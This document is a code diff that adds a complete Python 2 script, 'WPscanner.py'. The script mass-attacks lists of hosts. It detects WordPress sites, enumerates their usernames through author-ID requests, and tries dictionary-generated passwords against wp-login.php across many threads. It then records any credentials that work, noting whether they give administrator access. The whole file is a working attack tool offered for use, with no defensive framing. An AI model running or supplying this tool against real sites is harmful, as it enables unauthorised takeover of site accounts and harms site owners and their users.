@@ -1,0 +1,351 @@
+import urlparse
+import time
+import sys
+import os
+import re
+
+# Import multithreading modules
+import Queue
+import threading
+
+# Import requests, to handle the get and post requests
+import requests
+requests.packages.urllib3.disable_warnings()
+
+# Some necessary checks, to see if all the arguments are in order and the files exist
+# Check if the required arguments exist
+if len(sys.argv) != 6:
+    print "Usage: WPscanner.py host_list password_list wordpress_root_list output_file number_of_threads"
+    print "Example: WPscanner.py hosts.txt wordlist.txt uri.txt out.txt 25"
+    sys.exit()
+
+hostfile = sys.argv[1]
+wordfile = sys.argv[2]
+urifile = sys.argv[3]
+outfile = sys.argv[4]
+threads_n = sys.argv[5]
+
+# Make an integer from threads_n
+try:
+    threads_n = int(threads_n)
+
+except ValueError:
+    print "[!]Number of threads parameter is not a number!"
+    sys.exit()
+
+# Check if the files exist.
+for f in (hostfile, wordfile, urifile):
+    if not os.path.isfile(f):
+        print "[!]File {0} not found!".format(f)
+        sys.exit()
+
+
+def parse_pass(pattern, password, replacement):
+    """Parse a password and replace pattern with replacement."""
+
+    new_p = password
+
+    # Pattern is %user or %site
+    if pattern in password:
+                    
+        index_start = password.index(pattern)
+        index_number = index_start + 5
+        index_end = password[index_start + 1:].index("%") + 1 + index_start
+
+        # case %user%.
+        if index_number == index_end:
+            new_p = password.replace(pattern + "%", replacement)
+
+        # case %user9%.
+        elif password[index_number] in "1234567890" and index_end == index_start + 6:
+            new_p = password[: index_start] + replacement[: int(password[index_number])] + password[index_end + 1:]
+
+        # case %user99% with double digits.
+        # This is not supported, so just take the whole username.
+        elif password[index_number + 1] in "1234567890":
+            new_p = password[:index_start] + replacement + password[index_end + 1:]
+
+    return new_p
+
+
+def enum_user(session, url, author_i):
+    """Enumerate user of WordPress site."""
+
+    users = []
+    enum_url = "{0}/index.php?author={1}".format(url, author_i)
+
+    try:
+        request = session.get(enum_url)
+
+    # There was some connection error.
+    except requests.exceptions.RequestException:
+        return []
+
+    else:
+        # If the code = 404, the enumerable user has not been found.
+        if request.status_code != 404:
+
+            # If a author has been found, get the user name from the text.
+            match = re.search(r"/author/([\w\-]*)/", request.text)
+            if match:
+                user = match.group(1)
+                if "-" in user:
+                    users.append(user.replace("-", " "))
+                users.append(user)
+    
+    return users
+    
+
+def is_wordpress(session, url):
+    """Check if a site is WordPress. And build new url."""
+
+    # Try to get url/wp-login.php
+    login_url = "{0}/wp-login.php".format(url)
+    try:
+        r = session.get(login_url)
+
+    # There was some connection error.
+    except requests.exceptions.RequestException:
+        return False
+
+    else:
+
+        if r.ok and "wordpress" in r.text.lower() and urlparse.urlsplit(login_url).path == urlparse.urlsplit(r.url).path:
+            return True
+
+
+def wordpress_login(session, url, credentials):
+    """Try to login on a WordPress site. If logged in, check if user is admin.
+       Uses the redirect to go directly to a admin page, to lower the amount of needed requests."""
+
+    # Define the request parameters
+    login_url = "{url}/wp-login.php".format(url=url)
+    admin_url = "{url}/wp-admin/theme-install.php".format(url=url)
+
+    username, password = credentials
+
+    try:
+        request = session.post(login_url,
+                               data={"log": username,
+                                     "pwd": password,
+                                     "testcookie": "1",
+                                     "wp-submit": "Log in",
+                                     "redirect_to": admin_url})
+
+    except requests.exceptions.RequestException:
+        return False
+    
+    else:
+
+        if admin_url == request.url:
+            if request.ok:
+                return "Admin"
+            
+            else:
+                return "User"
+
+
+def clean_url(url):
+    """Clean a url, give it a scheme and remove all unnecessary data."""
+    
+    if url.endswith("/"):
+        url = url[:-1]
+
+    o = urlparse.urlsplit(url)
+
+    # Set the Scheme
+    if o.scheme == "":
+        new_scheme = "http"
+        url = "http://{0}".format(url)
+        o = urlparse.urlsplit(url)
+
+    else:
+        new_scheme = o.scheme
+    
+    if "." in o.path:
+        new_path = "/".join(o.path.split("/")[: -1])
+    
+    else:
+        new_path = o.path
+    
+    return urlparse.urlunparse((new_scheme, o.netloc, new_path, "", "", ""))
+
+
+def get_domain(url):
+    """Return domain without ext from url.
+       url = www.google.com returns google.
+       The only problem is that url = random.google.com returns random and not google.
+       This is quick and dirty hack, but there is not really a better alternative."""
+
+    o = urlparse.urlsplit(url)
+    netloc_list = o.netloc.split(".")
+
+    if netloc_list[0] == "www":
+        return netloc_list[1]
+
+    else:
+        return netloc_list[0]
+
+
+def run(login_queue, enumerate_queue, check_queue, thread_id, passwordlist, outputfile):
+    """The main code, that each greenlet runs.
+       It combines the checking, enumerating and attacking."""
+    sys.stdout.write("[+]Starting Thread-{0}\n".format(thread_id))
+
+    while not shutdown.is_set():
+
+        # Try to get from the login queue.
+        try:
+            url, user, password, session = login_queue.get(block=False)
+
+        except Queue.Empty:
+
+            # Try to get from the enumerate queue
+            try:
+                url, author_i, session = enumerate_queue.get(block=False)
+
+            except Queue.Empty:
+
+                # Try to get from the check queue
+                try:
+                    url = check_queue.get(block=False)
+
+                # If all the queues are empty, exit
+                except Queue.Empty:
+                    continue
+
+                # The code that checks if the site is a WordPress site
+                else:
+
+                    # Create the session, and set some parameters.
+                    session = requests.Session()
+                    session.verify = False
+                    session.timeout = 2
+                    session.headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0"}
+
+                    url = clean_url(url)
+
+                    sys.stdout.write("[*]Scanning: {0}\n".format(url))
+
+                    # Check whether the site is online and a wordpress site.
+                    if is_wordpress(session, url):
+                        sys.stdout.write("[+]Found Wordpress site: {0}\n".format(url))
+
+                        # Scan users 1 through 20
+                        for author_i in range(1, 21):
+                            enumerate_queue.put((url, author_i, session))
+
+                    check_queue.task_done()
+
+            # The code that enumerates the users
+            else:
+
+                sys.stdout.write("[*]Trying user: {0} #{1}\n".format(url, author_i))
+                users = enum_user(session, url, author_i)
+
+                if len(users):
+                    domain = get_domain(url)
+
+                    for user in users:
+                        sys.stdout.write("[+]Found user {0} : {1}\n".format(url, user))
+
+                        for password in passwordlist:
+                            temp_p = parse_pass("%site", password, domain)
+                            new_password = parse_pass("%user", temp_p, user)
+                            login_queue.put((url, user, new_password, session))
+
+                enumerate_queue.task_done()
+
+        # The code that performs a dictionary attack on the website, with the found users.
+        else:
+
+            sys.stdout.write("[*]Trying combination: {0}:{1}:{2}\n".format(url, user, password))
+            privilege = wordpress_login(session, url, (user, password))
+
+            if privilege:
+                sys.stdout.write("[+]Found password: {0}:{1}:{2}\n".format(url, user, password, privilege))
+
+                with open(outputfile, "a") as hF:
+                    hF.write("{0} : {1} : {2} ({3})\n".format(url, user, password, privilege))
+
+            login_queue.task_done()
+    
+    sys.stdout.write("[*]Exiting Thread-{0}\n".format(thread_id))
+    return
+
+# The main part of the code
+print "[*]Starting WPscanner!"
+start_time = time.time()
+
+# Create queue objects
+login_q = Queue.Queue()
+enumerate_q = Queue.Queue()
+check_q = Queue.Queue()
+shutdown = threading.Event()
+
+# Creating the wordlist
+wordlist = []
+with open(wordfile) as hPasswords:
+    for line in hPasswords:
+
+        line = line.strip()
+
+        if line == "":
+            continue
+
+        wordlist.append(line)
+
+wordlist = list(set(wordlist))
+
+# Create the urilist
+urilist = []
+with open(urifile) as hUri:
+    for line in hUri:
+
+        line = line.strip()
+
+        if not line.startswith("/"):
+            line = "/{0}".format(line)
+
+        urilist.append(line)
+
+urilist = list(set(urilist))
+
+# Read the hosts file, and put them in the appropriate queue
+print "[*]Putting hosts in queue."
+with open(hostfile, "r") as hHosts:
+    for line in hHosts:
+        line = line.strip()
+
+        if line == "":
+            continue
+
+        if line[-1] == "/":
+            line = line[: -1]
+
+        for ext in urilist:
+            check_q.put(line + ext)
+
+total = check_q.qsize()
+if not total or not len(urilist) or not len(wordlist):
+    print "[!]No hosts/passwords/wp_root_uris found!"
+    sys.exit()
+
+if total < threads_n:
+    threads_n = total
+
+
+print "[*]Starting {0} threads.".format(threads_n)
+# Create threads_n threads and put them in a nice list to .join later
+for i in xrange(threads_n):
+    
+    t = threading.Thread(target=run, args=(login_q, enumerate_q, check_q, 1 + i, wordlist, outfile))
+    t.start()
+
+# Work down the queues until they are all empty,
+check_q.join()
+enumerate_q.join()
+login_q.join()
+shutdown.set()
+
+print "[+]Done! Time: {time:.2f} seconds".format(time=time.time() - start_time)
